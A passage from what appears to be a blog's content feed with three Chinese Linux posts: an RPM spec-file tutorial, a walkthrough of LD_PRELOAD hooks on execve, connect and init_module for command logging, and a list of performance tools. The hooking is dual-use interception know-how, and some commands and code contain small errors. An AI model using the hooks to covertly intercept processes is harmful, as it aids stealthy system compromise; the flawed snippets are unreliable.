（开发&#x2F;函数库）</li><li>Development&#x2F;System （开发&#x2F;系统）</li><li>Development&#x2F;Tools （开发&#x2F;工具）</li><li>Documentation （文档）</li><li>System Environment&#x2F;Base（系统环境&#x2F;基础）</li><li>System Environment&#x2F;Daemons （系统环境&#x2F;守护）</li><li>System Environment&#x2F;Kernel （系统环境&#x2F;内核）</li><li>System Environment&#x2F;Libraries （系统环境&#x2F;函数库）</li><li>System Environment&#x2F;Shells （系统环境&#x2F;接口）</li><li>User Interface&#x2F;Desktops（用户界面&#x2F;桌面）</li><li>User Interface&#x2F;X （用户界面&#x2F;X窗口）</li><li>User Interface&#x2F;X Hardware Support （用户界面&#x2F;X硬件支持）</li></ul></li><li><p>Source：源程序软件包的名字。如 stardict-2.0.tar.gz；</p></li><li><p>%define：定义宏，例如<code>%define test 10</code>，这里定义了一个宏，名称为test，值为10，要使用这个宏，使用<code>%{testMacro}</code>或者<code>%testMacro</code>；</p></li><li><p>%description：软件包详细说明，可写在多个行上；</p></li></ul><h3 id="2-2-2-prep"><a href="#2-2-2-prep" class="headerlink" title="2.2.2 %prep"></a>2.2.2 %prep</h3><p>预处理段，通常用来执行一些解开源程序包的命令，为下一步的编译安装作准备，%prep和下面的%build，%install段一样，除了可以执行RPM所定义的宏命令（以%开头）以外，还可以执行Shell命令，命令可以有很多行；</p><h3 id="2-2-3-setup"><a href="#2-2-3-setup" class="headerlink" title="2.2.3 %setup"></a>2.2.3 %setup</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">%setup 不加任何选项，仅将软件包打开。<br>%setup -n newdir 将软件包解压在newdir目录。<br>%setup -c 解压缩之前先产生目录。<br>%setup -b num 将第num个<span class="hljs-built_in">source</span>文件解压缩。<br>%setup -T 不使用default的解压缩操作。<br>%setup -T -b 0 将第0个源代码文件解压缩。<br>%setup -c -n newdir 指定目录名称newdir，并在此目录产生rpm套件。<br>%patch 最简单的补丁方式，自动指定patch level。<br>%patch0 -p0 打第1个补丁，利用当前相对路径名称<br>%pacth1 -p2 打第2个补丁，忽略补丁文件第一层目录<br>%patch 0 使用第0个补丁文件，相当于%patch ?p 0。<br>%patch -s 不显示打补丁时的信息。<br>%patch -T 将所有打补丁时产生的输出文件删除。<br></code></pre></td></tr></table></figure><h3 id="2-2-4-build"><a href="#2-2-4-build" class="headerlink" title="2.2.4 %build"></a>2.2.4 %build</h3><p>所要执行的命令为生成软件包服务，如make 命令</p><h3 id="2-2-5-install"><a href="#2-2-5-install" class="headerlink" title="2.2.5 %install"></a>2.2.5 %install</h3><p>将软件安装到虚拟根目录，其中的命令在安装软件包时将执行，如make install命令</p><h3 id="2-2-6-clean"><a href="#2-2-6-clean" class="headerlink" title="2.2.6 %clean"></a>2.2.6 %clean</h3><p>清理一些临时文件，或是生产中不需要的文件</p><h3 id="2-2-7-files"><a href="#2-2-7-files" class="headerlink" title="2.2.7 %files"></a>2.2.7 %files</h3><p>指定安装时需要安装的文件列表，可以指定文件、目录，也可以使用通配符等。用于定义软件包所包含的文件，分为三类–说明文档（doc），配置文件（config）及执行程序，还可定义文件存取权限，拥有者及组别；</p><h3 id="2-2-8-changelog"><a href="#2-2-8-changelog" class="headerlink" title="2.2.8 %changelog"></a>2.2.8 %changelog</h3><p>修改日志，你可以将软件的每次修改记录到这里，保存到发布的软件包中，以便查询之用。每一个修改日志都有这样一种格式：第一行是：* 星期 月 日 年 修改人 电子信箱。其中：星期、月份均用英文形式的前3个字母，用中文会报错。接下来的行写的是修改了什么地方，可写多行。一般以减号开始，便于后续的查阅；</p><h1 id="三、相关指令"><a href="#三、相关指令" class="headerlink" title="三、相关指令"></a>三、相关指令</h1><h2 id="3-1-打包指令"><a href="#3-1-打包指令" class="headerlink" title="3.1 打包指令"></a>3.1 打包指令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 只生成二进制格式的rpm包（生成的文件会在对应的RPM目录下存在）</span><br>rpmbuild -bb xxx.spec<br><br><span class="hljs-comment"># 只生成src格式的rpm包（生成的文件会在刚才建立的SRPM目录下存在）</span><br>rpmbuild -bs xxx.spec<br><br><span class="hljs-comment"># 只需要生成完整的源文件（源文件存在目录BUILD下）</span><br>rpmbuild -bp xxx.spec<br><br><span class="hljs-comment"># 完全打包（产生以上3个过程分别生成的包。存放在相应的目录下）</span><br>rpmbuild -ba xxx.spec<br><br><br></code></pre></td></tr></table></figure><h2 id="3-2-解析包相关指令"><a href="#3-2-解析包相关指令" class="headerlink" title="3.2 解析包相关指令"></a>3.2 解析包相关指令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出rpm包包含的内容</span><br>rpm -qpl *.rpm<br><br><span class="hljs-comment"># 解压缩出rpm包</span><br>rpm2cpio *.rpm | cpio -div<br><br><span class="hljs-comment"># 安装spec文件中的所有编译依赖软件，BuidRequires</span><br>yum-duilddep *.spec<br></code></pre></td></tr></table></figure><h1 id="四-示例"><a href="#四-示例" class="headerlink" title="四 示例"></a>四 示例</h1><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Name:       clutter-gtk<br>Summary:    A basic GTK clutter widget<br>Version:    0.11.4<br>Release:    1.18<br>Group:      System/Libraries<br>License:    LGPLv2<br>URL:        http://www.clutter-project.org/<br>Source0:    http://www.clutter-project.org/sources/clutter-gtk/0.11/%&#123;name&#125;-%&#123;version&#125;.tar.bz2<br>Source100:  clutter-gtk.yaml<br>Requires(post): /sbin/ldconfig<br>Requires(postun): /sbin/ldconfig<br>BuildRequires:  pkgconfig(clutter-1.0)<br>BuildRequires:  pkgconfig(glib-2.0)<br>BuildRequires:  pkgconfig(gl)<br>BuildRequires:  pkgconfig(gtk+-2.0)<br>BuildRequires:  pkgconfig(cairo)<br>BuildRequires:  pkgconfig(pango)<br>BuildRequires:  pkgconfig(atk)<br>/* 这里增加了一个patch  <br> * 打patch 方法 diff -Nur old new&gt;add-gthread.patch<br> */<br>Patch0:add-gthread.patch<br><br>%description<br>This library allows <br><br>/* 这里为添加开发包相关信息的位置 */<br>%package devel<br>Summary:    Clutter-Gtk header files and development libraries <br>Group:      Development/Libraries                                     <br>Requires:   %&#123;name&#125; = %&#123;version&#125;-%&#123;release&#125; <br><br>%description devel <br>Development environment <span class="hljs-keyword">for</span> clutter-gtk<br><br>%prep<br><br>/**setup 参数***************************<br>%setup 不加任何选项，仅将软件包打开。<br>%setup -n newdir 将软件包解压在newdir目录。<br>%setup -c 解压缩之前先产生目录。<br>%setup -b num 将第num个<span class="hljs-built_in">source</span>文件解压缩。<br>%setup -T 不使用default的解压缩操作。<br>%setup -T -b 0 将第0个源代码文件解压缩。<br>%setup -c -n newdir 指定目录名称newdir，并在此目录产生rpm套件。<br>%patch 最简单的补丁方式，自动指定patch level。<br>%patch 0 使用第0个补丁文件，相当于%patch ?p 0。<br>%patch -s 不显示打补丁时的信息。<br>%patch -T 将所有打补丁时产生的输出文件删除。<br>*************************************/<br>%setup -q -n %&#123;name&#125;-%&#123;version&#125; <br>/* 如果原来只有一个“Patch:”,您增加“Patch1:”,则在SPEC文件%setup行后面的<br>   %patch -p1后面新增一行: %patch1 -p1 依此类推.<br> */<br>%patch0 -p1<br><br>%build <br>%configure --disable-static <br>make %&#123;?<span class="hljs-built_in">jobs</span>:-j%<span class="hljs-built_in">jobs</span>&#125; <br><br>%install <br>%make_install<br>/usr/lib/rpm/brp-strip-shared   /* 如果为库文件过大，可以加入此行，去除debug信息 */<br><br>%files <br>%defattr(-,root,root,-) <br>%doc AUTHORS ChangeLog COPYING NEWS <br>%&#123;_libdir&#125;/libclutter-gtk-*.so*.0 <br><br>%files devel %defattr(-,root,root,-)<br>%&#123;_libdir&#125;/pkgconfig/*.pc <br>%&#123;_includedir&#125;/clutter-gtk-0.12/clutter-gtk<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> RPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用snoopy进行execve/execv、connect、init_module hook</title>
      <link href="/2019/01/01/snoopy/"/>
      <url>/2019/01/01/snoopy/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><a href="https://github.com/a2o/snoopy">Snoopy</a>旨在通过提供已执行命令的日志来帮助系统管理员，它对用户和应用程序是完全透明，通过将它链接到程序中，以提供对<code>execve()</code>调用的封装，记录信息通过<code>syslog</code>完成。</p><blockquote><p>Snoopy development has been migrated to github. Please follow the link “Snoopy Logger Web Site” below.</p><p>Snoopy is designed to aid a sysadmin by providing a log of commands executed. Snoopy is completely transparent to the user and applications. It is linked into programs to provide a wrapper around calls to execve(). Logging is done via syslog.</p></blockquote><h2 id="二、注意事项"><a href="#二、注意事项" class="headerlink" title="二、注意事项"></a>二、注意事项</h2><ul><li>Hook函数的覆盖完备性，对于Linux下的指令执行来说，有7个glibc的api都可实现指令执行功能，对这些API对要进行hook：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 执行参数filename字符串所代表的文件路径，第二个参数是利用数组指针来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组，该函数属于内核级系统调用；</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename， <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[]， <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-comment">// 执行参数filename字符串所代表的文件路径，第二个参数代表执行该文件时传递的argv[0],argv[1].....最后一个参数必须用空指针NULL作结束，该函数需要调用execve的库函数；</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execl</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename， <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg0， ... <span class="hljs-comment">/* (char *)0 */</span> )</span>;<br><span class="hljs-comment">// 内核级系统调用</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename， <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-comment">// 内核级系统调用</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename， <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg0， ...<span class="hljs-comment">/* (char *)0， char *const envp[] */</span> )</span>;<br><span class="hljs-comment">// 内核级系统调用</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execlp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename， <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg0， ... <span class="hljs-comment">/* (char *)0 */</span> )</span>;<br><span class="hljs-comment">// 内核级系统调用</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename， <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fexecve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd， <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[]， <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br></code></pre></td></tr></table></figure><ul><li>系统中是否存在hook函数的重名覆盖问题，通常在以下场景下：<ul><li><code>/etc/ld.so.preload</code>中填写了多条.so加载条目；</li><li>其他程序通过<code>export LD_PRELOAD=..</code>临时指定了待加载so的路径，在很多情况下，出于系统管理或者集群系统日志收集的目的，运维人员会向系统中注入.so文件，对特定function函数进行hook，这个时候，当我们注入的.so文件中的hook函数和原有的hook函数存在同名的情况，Linux会自动忽略之后载入了hook函数，这种情况我们称之为”共享对象全局符号介入”；</li></ul></li><li>注入<code>.so</code>对特定函数进行hook要保持原始业务的兼容性，即处理完之后仍然需要执行原函数的调用，为了实现透明hook(完成业务逻辑的同时不影响正常的系统行为)、维持调用链，那么需要使用<a href="%5Bhttp://www.tecyle.com/2017/03/03/dlsym%E5%8F%82%E6%95%B0-rtld_next%E8%AF%A6%E8%A7%A3/%5D(http://www.tecyle.com/2017/03/03/dlsym%E5%8F%82%E6%95%B0-rtld_next%E8%AF%A6%E8%A7%A3/)">RTLD_NEXT</a>；</li><li>尽量减小hook函数对原有调用逻辑的延时，hook操作本身也会产生一定的延时，我们需要尽量减少从函数入口到调用原函数这块的代码逻辑，尽量减少多余的执行时间；</li></ul><h1 id="三、代码实践"><a href="#三、代码实践" class="headerlink" title="三、代码实践"></a>三、代码实践</h1><ul><li>hook.c</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/ip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/tcp.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(RTLD_NEXT)</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> REAL_LIBC RTLD_NEXT</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> REAL_LIBC ((void *) -1L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FN(ptr, type, name, args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)</span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span> &#123;<br>    <span class="hljs-type">static</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">char</span> **, <span class="hljs-type">char</span> **)</span>;<br>    FN(func,<span class="hljs-type">int</span>,<span class="hljs-string">&quot;execve&quot;</span>,(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">char</span> **<span class="hljs-type">const</span>, <span class="hljs-type">char</span> **<span class="hljs-type">const</span>)); <br><br>    <span class="hljs-comment">// print the log</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;filename: %s, argv[0]: %s, envp:%s\n&quot;</span>, filename, argv[<span class="hljs-number">0</span>], envp);<br><br>    <span class="hljs-keyword">return</span> (*func) (filename, (<span class="hljs-type">char</span>**) argv, (<span class="hljs-type">char</span> **) envp);<br>&#125; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span> &#123;<br>    <span class="hljs-type">static</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">char</span> **)</span>;<br>    FN(func,<span class="hljs-type">int</span>,<span class="hljs-string">&quot;execv&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">char</span> **<span class="hljs-type">const</span>)); <br><br>    <span class="hljs-comment">// print the log</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;filename: %s, argv[0]: %s\n&quot;</span>, filename, argv[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> (*func) (filename, (<span class="hljs-type">char</span> **) argv);<br>&#125;  <br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span> &#123; <br>    <span class="hljs-type">static</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*func)</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *, <span class="hljs-type">socklen_t</span>)</span>;<br>    FN(func,<span class="hljs-type">int</span>,<span class="hljs-string">&quot;connect&quot;</span>, (<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *, <span class="hljs-type">socklen_t</span>)); <br><br>    <span class="hljs-comment">/* print the log, 获取、打印参数信息的时候需要注意</span><br><span class="hljs-comment">     * 1. 加锁</span><br><span class="hljs-comment">     * 2. 拷贝到本地栈区变量中</span><br><span class="hljs-comment">     * 3. 然后再打印</span><br><span class="hljs-comment">     * 调试的时候发现直接获取打印会导致core dump */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket connect hooked!!\n&quot;</span>);<br><br>    <span class="hljs-comment">//return (*func) (sockfd, (const struct sockaddr *) addr, (socklen_t)addrlen);</span><br>    <span class="hljs-keyword">return</span> (*func) (sockfd, addr, addrlen);<br>&#125;  <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_module</span><span class="hljs-params">(<span class="hljs-type">void</span> *module_image, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *param_values)</span> &#123; <br>    <span class="hljs-type">static</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*func)</span><span class="hljs-params">(<span class="hljs-type">void</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<br>    FN(func,<span class="hljs-type">int</span>,<span class="hljs-string">&quot;init_module&quot;</span>,(<span class="hljs-type">void</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)); <br><br>    <span class="hljs-comment">// print the log, lkm的加载不需要取参数，只需要捕获事件本身即可</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;lkm load hooked!!\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> (*func) ((<span class="hljs-type">void</span> *)module_image, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)len, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)param_values);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译运行：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编译</span><br>gcc -fPIC -shared -o hook.so hook.c -ldl<br><br><span class="hljs-comment"># 运行</span><br>LD_PRELOAD=./hook.so nc www.baidu.com 80  <br></code></pre></td></tr></table></figure><ul><li>运行结果：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">socket connect hooked!!<br>socket connect hooked!!<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux操作系统知识点整理</title>
      <link href="/2018/12/12/linux-tools-notes/"/>
      <url>/2018/12/12/linux-tools-notes/</url>
      
        <content type="html"><![CDATA[<h1 id="一、系统工具相关"><a href="#一、系统工具相关" class="headerlink" title="一、系统工具相关"></a>一、系统工具相关</h1><h3 id="1-1、CPU性能工具："><a href="#1-1、CPU性能工具：" class="headerlink" title="1.1、CPU性能工具："></a>1.1、CPU性能工具：</h3><ul><li>平均负载：<ul><li><code>uptime</code>：最简单；</li><li><code>top</code>：提供了最全的指标；</li><li><code>/proc/loadavg</code>：常用于监控系统；</li></ul></li><li>系统CPU使用率：<ul><li><code>vmstat</code>：只可以动态查看；</li><li><code>mpstat</code>：只可以动态查看；</li><li><code>top</code>：只可以动态查看；</li><li><code>sar</code>：不仅可以动态查看，还可以记录历史数据；</li><li><code>/proc/stat</code>：是其他性能工具的数据来源，也可用于监控；</li></ul></li><li>进程CPU使用率：<ul><li><code>top</code>：可以按照CPU使用率给进程排序；</li><li><code>ps</code>：可以按照CPU使用率给进程排序；</li><li><code>pidstat</code>：只显示实际用了CPU的进程；</li><li><code>htop</code>：可以以不同的颜色显示，更加直观；</li><li><code>atop</code>：可以以不同的颜色显示，更加直观；</li></ul></li><li>系统上下文切换：<ul><li><code>vmstat</code>：除了上下文切换的次数，还提供运行状态和不可中断状态进程的数量；</li></ul></li><li>进程上下文切换：<ul><li><code>pidstat</code>：注意加上-w选项；</li></ul></li><li>软中断：<ul><li><code>top</code>：提供软中断CPU的使用率；</li><li><code>mpstat</code>：提供了各种软中断在每个CPU上的运行次数；</li><li><code>/proc/softirps</code>：提供了各种软中断在每个CPU上的运行次数；</li></ul></li><li>硬中断：<ul><li><code>vmstat</code>：提供总的中断次数；</li><li><code>/proc/interrupts</code>：提供各种中断在每个CPU上的运行的累积次数；</li></ul></li><li>网络：<ul><li><code>dstat</code>：提供总的网络接收和发送情况；</li><li><code>sar</code>：提供总的网络接收和发送情况；</li><li><code>tcpdump</code>：动态的抓取正在运行的网络通讯；</li></ul></li><li>IO：<ul><li><code>dstat</code>：提供了I&#x2F;O的整体情况；</li><li><code>sar</code>：提供了I&#x2F;O的整体情况；</li></ul></li><li>CPU缓存：<ul><li><code>perf</code>：使用perf stat的子命令；</li></ul></li><li>CPU数：<ul><li><code>lscpu</code>：lscpu更加直观；</li><li><code>/proc/cpuinfo</code>：</li></ul></li><li>事件刨析：<ul><li><code>perf</code>：用来分析热点函数以及调用栈；</li><li><code>火焰图</code>：用来分析热点函数以及调用栈；</li><li><code>execsnoop</code>：用来监测短时进程；</li></ul></li><li>动态追踪：<ul><li><code>ftrace</code>：用来追踪内核函数的调用栈；</li><li><code>bcc</code>：用于跟踪内核或应用程序的执行过程，要求内核版本&gt;&#x3D;4.1</li><li><code>systemtab</code>：用于跟踪内核或应用程序的执行过程</li></ul></li></ul><h3 id="1-2、内存性能工具："><a href="#1-2、内存性能工具：" class="headerlink" title="1.2、内存性能工具："></a>1.2、内存性能工具：</h3><ul><li>系统已用&#x2F;可用&#x2F;剩余内存：<ul><li><code>free</code>：最为简单；</li><li><code>vmstat</code>：更为全面；</li><li><code>sar</code>：更为全面；</li><li><code>/proc/meminfo</code>：其他工具的数据来源，也常用于监控系统中；</li></ul></li><li>进程虚拟&#x2F;常驻&#x2F;共享内存：<ul><li><code>ps</code>：最为简单；</li><li><code>top</code>：最为简单；</li><li><code>pidstat</code>：需要加上-r选项；</li><li><code>/proc/pid/stat</code>：是其他工具的数据来源，也常用于监控系统中；</li><li><code>/proc/pid/status</code>：是其他工具的数据来源，也常用于监控系统中；</li></ul></li><li>进程内存分布：<ul><li><code>pmap</code>：</li><li><code>/proc/pid/maps</code>：是pmap的数据来源；</li></ul></li><li>进程Swap换出内存：<ul><li><code>top</code>：</li><li><code>/proc/pid/status</code>：是top的数据来源；</li></ul></li><li>进程缺页异常：<ul><li><code>ps</code>：</li><li><code>top</code>：</li><li><code>pidstat</code>：注意给pidstat加上-r选项；</li></ul></li><li>系统换页情况：<ul><li><code>sar</code>：注意加上-B选项；</li></ul></li><li>缓存&#x2F;缓冲区用量：<ul><li><code>free</code>：</li><li><code>vmstat</code>：最为常用；</li><li><code>sar</code>：</li><li><code>cachestat</code>：需要安装bcc；</li></ul></li><li>缓存&#x2F;缓冲区命中率：<ul><li><code>cachetop</code>：需要安装bcc；</li></ul></li><li>Swap已用空间和剩余空间：<ul><li><code>free</code>：最为简单；</li><li><code>sar</code>：还可以记录历史；</li></ul></li><li>Swap换入换出：<ul><li><code>vmstat</code>：最为简单；</li><li><code>sar</code>：还可以记录历史；</li></ul></li><li>内存泄漏监测：<ul><li><code>memleak</code>：需要安装bcc；</li><li><code>valgrind</code>：还可以在旧版本（如3.x）内核中使用；</li></ul></li><li>指定文件的缓存大小：<ul><li><code>pcstat</code>：需要从源码下载安装；</li></ul></li></ul><h3 id="1-3、文件系统和磁盘I-O性能工具"><a href="#1-3、文件系统和磁盘I-O性能工具" class="headerlink" title="1.3、文件系统和磁盘I&#x2F;O性能工具"></a>1.3、文件系统和磁盘I&#x2F;O性能工具</h3><ul><li>文件系统空闲容量、使用量以及剩余空间：<ul><li><code>df</code>：详细文档可以执行 info coreutils ‘df invocation’ 命令进程查询；</li></ul></li><li>索引节点容量、使用量以及剩余量：<ul><li><code>df</code>：注意加上 -i 选项；</li></ul></li><li>叶缓存和可回收Slab缓存：<ul><li><code>/proc/meminfo</code>：是其他工具的数据来源，也常用于监控；</li><li><code>sar</code>：注意加上 -r 选项；</li><li><code>vmstat</code>：</li></ul></li><li>缓冲区：<ul><li><code>/proc/meminfo</code>：是其他工具的数据来源，也常用于监控；</li><li><code>sar</code>：注意加上 -r 选项；</li><li><code>vmstat</code>：</li></ul></li><li>目录页、索引节点以及文件系统的缓存：<ul><li><code>/proc/slabinfo</code>：常用于监控；</li><li><code>slabtop</code>：slabtop更加直观；</li></ul></li><li>磁盘I&#x2F;O使用率、IOPS、吞吐量、响应时间、I&#x2F;O平均大小以及等待队列长度：<ul><li><code>iostat</code>：最为常用，注意使用 iostat -d -x 选项；</li><li><code>sar</code>：注意使用 sar -d 选项；</li><li><code>dstat</code>：</li><li><code>/proc/diskstats</code>：是其他工具的数据来源，也常用于监控；</li></ul></li><li>进程I&#x2F;O大小以及I&#x2F;O延迟：<ul><li><code>pidstat</code>：注意使用 pidstat -d 选项；</li><li><code>iotop</code>：</li></ul></li><li>块设备I&#x2F;O事件追踪：<ul><li><code>blktrace</code>：需要跟 blkparse 配合使用，比如 blktrace -d &#x2F;dev&#x2F;sda -o | blkparse -i</li></ul></li><li>进程I&#x2F;O系统调用跟踪：<ul><li><code>strace</code>：只可以跟踪单个进程；</li><li><code>perf trace</code>：可以跟踪所有进程的系统调用；</li></ul></li><li>进程块设备I&#x2F;O大小跟踪：<ul><li><code>biosnoop</code>：需要安装bcc；</li><li><code>biotop</code>：需要安装bcc；</li></ul></li><li>动态追踪：<ul><li><code>ftrace</code>：用于跟踪内核函数调用栈；</li><li><code>bcc</code>：用于跟踪内核或应用程序的执行过程（要求内核版本&gt;&#x3D;4.1）；</li><li><code>systemtab</code>：用于跟踪内核或应用程序的执行过程；</li></ul></li></ul><h3 id="1-4、网络性能工具"><a href="#1-4、网络性能工具" class="headerlink" title="1.4、网络性能工具"></a>1.4、网络性能工具</h3><ul><li>吞吐量（BPS）：<ul><li><code>sar</code>：可以查看网络接口的网络吞吐量；</li><li><code>nethogs</code>：可以查看进程的网络吞吐量；</li><li><code>iftop</code>：可以查看IP地址的网络吞吐量；</li><li><code>/proc/net/dev</code>：常用于监控；</li></ul></li><li>吞吐量（PPS）：<ul><li><code>sar</code>：注意使用 sar -n DEV 选项；</li><li><code>/proc/net/dev</code>：</li></ul></li><li>网络连接数：<ul><li><code>netstat</code>：</li><li><code>ss</code>：速度更快；</li></ul></li><li>网络错误数：<ul><li><code>netstat</code>：注意使用 netstat -s 选项；</li><li><code>sar</code>：注意使用 sar -n EDEV&#x2F;EIP 选项；</li></ul></li><li>网络延迟：<ul><li><code>ping</code>：基于ICMP；</li><li><code>hping3</code>：基于TCP协议；</li></ul></li><li>连接跟踪数：<ul><li><code>conntrack</code>：可用于查看所有连接跟踪数的详细信息；</li><li><code>/proc/sys/net/netfilter/nf_conntrack_count</code>：显示连接跟踪的数量；</li><li><code>/proc/sys/net/netfilter/nf_conntrack_max</code>：限制总的连接跟踪的数量；</li></ul></li><li>路由：<ul><li><code>mtr</code>：用于排查和定位网络链路中的路由问题；</li><li><code>traceroute</code>：用于排查和定位网络链路中的路由问题；</li><li><code>route</code>：用于查询路由表；</li></ul></li><li>DNS：<ul><li><code>dig</code>：用于排查DNS的解析问题；</li><li><code>nslookup</code>：用于排查DNS的解析问题；</li></ul></li><li>防火墙和NAT：<ul><li><code>iptables</code>：用于排查防火墙及NAT的问题；</li></ul></li><li>网卡选项：<ul><li><code>ethtool</code>：用于查看和配置网络接口的功能选项；</li></ul></li><li>网络抓包：<ul><li><code>tcpdump</code>：服务中使用tcpdump抓包；</li><li><code>wireshark</code>：图形界面分析抓包的数据；</li></ul></li><li>动态追踪：<ul><li><code>ftrace</code>：用于跟踪内核函数的调用栈；</li><li><code>bcc</code>：用于跟踪内核或应用程序的执行过程（要求内核版本&gt;&#x3D;4.1）；</li><li><code>systemtap</code>：用于跟踪内核或应用程序的执行过程；</li></ul></li></ul>]]></content>
